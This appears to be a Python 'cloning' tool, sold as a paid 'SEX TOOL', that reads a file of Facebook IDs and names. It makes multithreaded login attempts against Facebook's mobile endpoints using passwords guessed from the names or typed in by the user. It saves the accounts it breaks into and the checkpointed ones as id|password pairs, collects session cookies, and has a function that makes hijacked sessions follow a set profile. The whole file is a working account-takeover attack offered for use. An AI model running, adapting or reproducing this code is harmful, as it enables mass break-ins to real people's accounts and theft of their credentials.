#!/usr/bin/python3
import os
import sys
import re
import time
import random
import json
import string
import requests
import bs4
from concurrent.futures import ThreadPoolExecutor as ThreadPool
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
import os
import random
import time
import re
import json
import uuid
import subprocess
import rich
import shutil
import webbrowser
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from time import sleep as jeda
# from rich import print as printer
# from rich.panel import Panel
from urllib.parse import quote

import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests
import os
import re
import bs4
import platform
import sys
import json
import time
import random
import datetime
import subprocess
import threading
import itertools
import base64
import uuid
import zlib
from concurrent.futures import ThreadPoolExecutor as ahmads
from datetime import datetime
from bs4 import BeautifulSoup
from time import sleep as jeda


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June',
         'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m'
M = '\033[1;31m'
H = '\033[1;32m'
K = '\x1b[1;97m'
B = '\x1b[1;97m'
U = '\x1b[1;97m'
O = '\x1b[1;97m'
N = '\x1b[0m'    #
my_color = [
    P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data, data2 = {}, {}
aman, cp, salah = 0, 0, 0
ubahP, fuck, pwBaru = [], [], []
Apk = []
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June",
             "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
def loading():
    animation = ["[\x1b[1;91mâ– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]","[\x1b[1;92mâ– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;93mâ– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;94mâ– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;95mâ– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡â–¡]", "[\x1b[1;96mâ– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡â–¡]", "[\x1b[1;97mâ– â– â– â– â– â– â– \x1b[0mâ–¡â–¡â–¡]", "[\x1b[1;98mâ– â– â– â– â– â– â– â– \x1b[0mâ–¡â–¡]", "[\x1b[1;99mâ– â– â– â– â– â– â– â– â– \x1b[0mâ–¡]", "[\x1b[1;910mâ– â– â– â– â– â– â– â– â– â– \x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r {N}[{H}â€¢{N}] {H}Loading...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
   
logo="""
      
     \x1b[1;91m######     ########    ##     ##    
\x1b[1;92m##    ##    ##           ##   ##     
\x1b[1;97m##          ##            ## ##      
 \x1b[1;98m######     ######         ###       
      \x1b[1;94m##    ##            ## ##      
\x1b[1;93m##    ##    ##           ##   ##     
 \x1b[1;95m######     ########    ##     ##              SEX:)
\x1b[1;92m>> AUTHOR : PICCI-ARIYAN
\x1b[1;93m>> FB       : PICCI-ARIYAN
\x1b[1;92m>> TOOLS STATUS : FREE
\x1b[1;98m>>  Version  : 0.0.1
\033[1;35mSEX:)
   \033[1;32mWELLCOME TO \033[1;37mSEX  TOOL\33[0;m       
\033[1;39mSEX:)"""   
def hasil(OK, cp):
    if not len(OK) != 0:
        pass
    if len(cp) != 0:
        print('\n\n\x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mOK.txt' % (
            H, P, str(len(ok))))
        print('\x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mCP.txt' %
              (H, P, str(len(cp))))
        input("\x1b[1;97mPress enter to back  ")
        ahmad()   
def ahmad():
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    print('\033[1;33m[1] File Cloning')
    print('[E] Exit')
    print('')
    _ahmad___ = input('\033[1;36m       Choose option : ')
    if _ahmad___ in ('1', '01'):     
        __AJAAA__().malikx(id)
    if _ahmad___ in ('E', 'ee'):
        pass



class __AJAAA__:
    def __init__(self):
        self.id = []
    def malikx(self,id):
        os.system("clear")
        print(logo)
        self.cnt = input('\033[1;92m Enter File Name :\033[1;92m ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
#            self.__ok__()
            self.__pler__()
        else:
            print(' [!] Choose Correct One');
            self.ahmadx(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop

        animasi = random.choice(["\x1b[1;92m[ASAD","\x1b[1;92m[ASAD]","\x1b[1;92m[ASAD]","\x1b[1;92m[ASAD]","\x1b[1;92m[ASAD]","\x1b[1;92m[ASAD]","\x1b[1;92m[ASAD]"])
        sys.stdout.write(f"\r {N}{animasi} {N}{loop}{N}/{M}{len(self.id)} {N}[{H}OK:{len(ok)}{N}][{B}CP:{len(cp)}{B}] [{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session = requests.Session()
                header={
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://free.facebook.com/",
                    "accept-encoding":"gzip, deflate, br",
                    "accept-language":"en-US,en;q=0.9"
                 }                       
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://free.facebook.com/",
                    "accept-encoding":"gzip, deflate, br",
                    "accept-language":"en-US,en;q=0.9"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    print(f"\r{H} [OK-ASADR] {user} | {pw}")   
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    cek_apk(session,coki)
                    open('ASAD_OK.txt' , 'a').write('%s\n' % wrt)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print(f"\r {P} [CP-ASAD]               \n USERNAME||  {user}     \n PASSWORD|| {pw}")
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('ASAD_CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print('\r%s [CP-ASAD] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('ASAD_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://m.facebook.com/profile.php?id=100081530106222', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://m.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print('\033[1;92m[1] \033[1;96mCrack Auto Pass ')
        print(
            '\033[1;92m[2] \033[1;96mCrack Digit Passwords')
        print(
            '\033[1;92m[3] \033[1;96mCrack Name + Digit Pass ')
        print(
            '\033[1;92m[4] \033[1;96mCrack With first last and fullname Pass ')
        print('\033[1;97m-----------------------------------------------')
        chi = input('\033[1;92m[•] \033[1;97mChoose : \033[1;92m')
        if chi == '':
            print('\nSelect Correct One')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print('[1] Method 1')
            print('[2] Method 2')
            print('[3] Method 3')
            jbg = input('Select: ')         
            with ahmads(max_workers=70) as ahmad:
                for zsb in self.id:  # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+xz[1]]
                        else:
                            pwx = [name, xz[0]+xz[1]]
                        if jbg == '1':
                            ahmad.submit(self.__metode__, uid,
                                           pwx, "free.facebook.com")
                        elif jbg == '2':
                            ahmad.submit(self.__metode__, uid,
                                           pwx, "mbasic.facebook.com")
                        elif jbg == '3':
                            ahmad.submit(self.__metode__, uid,
                                           pwx, "p.facebook.com")
                        else:
                            ahmad.submit(self.__metode__, uid,
                                           pwx, "free.facebook.com")
                    except:
                        pass
            hasil(ok, cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            print('[1] Method 1')
            print('[2] Method 2')
            print('[3] Method 3')
            jbg = input('Select: ')
            pp1 = input('\033[1;97mPass 01 : \033[1;92m')
            pp2 = input('\033[1;97mPass 02 : \033[1;92m')
            pp3 = input('\033[1;97mPass 03 : \033[1;92m')
            os.system("clear")
            print(logo)
            print('\033[1;93m[~] \033[1;97mTotal Ids : \033[1;92m%s ' %
                  len(self.id))
            print('\033[1;93m[~] \033[1;97mCloning Started Enjoy\033[1;97m')
            print(47*"-")
            with ahmads(max_workers=70) as ahmad:
                for zsb in self.id:  # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [pp1, pp2, pp3]
                        else:
                            pwx = [pp1, pp2, pp3]
                        if jbg == '1':
                            ahmad.submit(self.__metode__, uid,
                                           pwx, "free.facebook.com")
                        elif jbg == '2':
                            ahmad.submit(self.__metode__, uid,
                                           pwx, "mbasic.facebook.com")
                        elif jbg == '3':
                            ahmad.submit(self.__metode__, uid,
                                           pwx, "p.facebook.com")
                        else:
                            ahmad.submit(self.__metode__, uid,
                                           pwx, "free.facebook.com")
                    except:
                        pass
            hasil(ok, cp)
        elif chi in ('3', '03'):
            os.system("clear")
            print(logo)
            print('[1] Method 1')
            print('[2] Method 2')
            print('[3] Method 3')
            jbg = input('Select: ')
            pxp1 = input('\033[1;97mfirst + : \033[1;92m')
            pxp2 = input('\033[1;97mfirst + : \033[1;92m')
            pxp3 = input('\033[1;97mfirst + : \033[1;92m')
            ptp4 = input('\033[1;92mlast + : \033[1;92m')
            os.system("clear")
            print(logo)
            with ahmads(max_workers=70) as ahmad:
                for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [xz[0]+pxp1, xz[0]+pxp2,
                                   xz[0]+pxp3, xz[1]+ptp4]
                        else:
                            pwx = [xz[0]+pxp1, xz[0]+pxp2,
                                   xz[0]+pxp3, xz[1]+ptp4]
                        if jbg == '1':
                            ahmad.submit(self.__metode__, uid,
                                           pwx, "free.facebook.com")
                        elif jbg == '2':
                            ahmad.submit(self.__metode__, uid,
                                           pwx, "mbasic.facebook.com")
                        elif jbg == '3':
                            ahmad.submit(self.__metode__, uid,
                                           pwx, "p.facebook.com")
                        else:
                            ahmad.submit(self.__metode__, uid,
                                           pwx, "free.facebook.com")
                    except:
                        pass
            hasil(ok, cp)
        elif chi in ('4', '04'):
            os.system("clear")
            print(logo)
            print('[1] Method 1')
            print('[2] Method 2')
            print('[3] Method 3')
            jbg = input('Select: ')
            with ahmads(max_workers=70) as ahmad:
                for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0].lower() + ' ' + xz[1].lower()]
                        else:
                            pwx = [name, xz[0].lower() + ' ' + xz[1].lower()]
                        if jbg == '1':
                            ahmad.submit(self.__metode__, uid,
                                           pwx, "free.facebook.com")
                        elif jbg == '2':
                            ahmad.submit(self.__metode__, uid,
                                           pwx, "mbasic.facebook.com")
                        elif jbg == '3':
                            ahmad.submit(self.__metode__, uid,
                                           pwx, "p.facebook.com")
                        else:
                            ahmad.submit(self.__metode__, uid,
                                           pwx, "free.facebook.com")
                    except:
                        pass
            hasil(ok, cp)
        else:
            print('\n Select Valid One')
            self.__pler__()
def mengecek_():
    try:
           os.system('git pull');os.system('clear')
           cek = open ("Apv","r").read()
    except (KeyError,IOError):
           os.system('clear');print(' %s[%s×%s] Expired license data'%(N,M,N));jeda(3)
           _f_a_md__eck()
    if os.path.exists('Apv'):
           try:
                   cek = open('Apv', 'r').read()
                   lis = requests.get("https://github.com/ARIYAN-404-CYBER/RANDOM/blob/main/approval.txt").text.strip()
                   if cek in lis:
                          os.system('clear');(logo)
                          jalan(' %s[%s✓%s] Your license is active √'%(N,H,N));jeda(2);login()
                   else:
                          os.system('clear');(logo)
                          jalan(' %s[%s×%s] Your license is not active'%(N,M,N));jeda(2);os.system('rm -rf Apv');_f_a_md__eck()
           except IOError:
                   _f_a_md__eck()
    else:
           _f_a_md__eck()
def _f_a_md__eck():
    os.system('clear')
    print(logo)
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = "-".join(uuid)
    try:
        httpCaht = requests.get('https://pastebin.com/raw/mwhYMj2G').text
        if id in httpCaht:
            print("\033[1;92mYour Token is successfully Approved")
            msg = str(os.geteuid())
            time.sleep(0.3)
            ahmad()
            pass
        else:
            print("\x1b[37;1mYour Token :\033[1;92m "+id)
            print('\033[1;97m-----------------------------------------------')
            print("\x1b[1;97mThis is Paid tool > 300 for 7 days")
            print("\x1b[1;97mCopy Token and Press Enter")
            os.system('xdg-open https://wa.me/+8801706200853')
            time.sleep(1)
            sys.exit()
    except:
        sys.exit()
if __name__=='__main__':
    try:
        os.system('git pull')
        mengecek_()
        ahmad()
    except requests.exceptions.ConnectionError:
        exit(f'\n [{M}!{C}] Internet connection problem')
